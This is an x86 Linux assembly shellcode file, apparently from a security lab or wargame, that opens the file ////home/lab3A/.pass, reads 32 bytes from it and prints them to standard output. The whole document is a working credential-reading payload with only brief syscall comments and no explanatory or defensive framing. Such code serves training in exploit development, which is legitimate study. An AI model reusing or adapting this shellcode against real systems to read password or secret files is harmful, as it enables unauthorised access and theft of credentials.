section .text

global _start

_start:

xor ebx, ebx
xor ecx, ecx
mul ebx

; open (path to file, flags), sys call nr 5
; 2f 2f 2f 2f 68 6f 6d 65 2f 6c 61 62 33 41 2f 2e 70 61 73 73   ////home/lab3A/.pass

mov al, 5
push ecx
push 0x73736170
push 0x2e2f4133
push 0x62616c2f
push 0x656d6f68
push 0x2f2f2f2f
mov ebx, esp
int 0x80

; read(int fd, buf, count), sys call nr 3

mov ebx, eax
mov al, 3
mov ecx, esp
mov dl, 32
int 0x80

; write(int fd, buf, count), sys call nr 4

mov al, 4
mov bl, 1
mov ecx, esp
mov dl, 32
int 0x80

mov al, 1
xor ebx, ebx
int 0x80
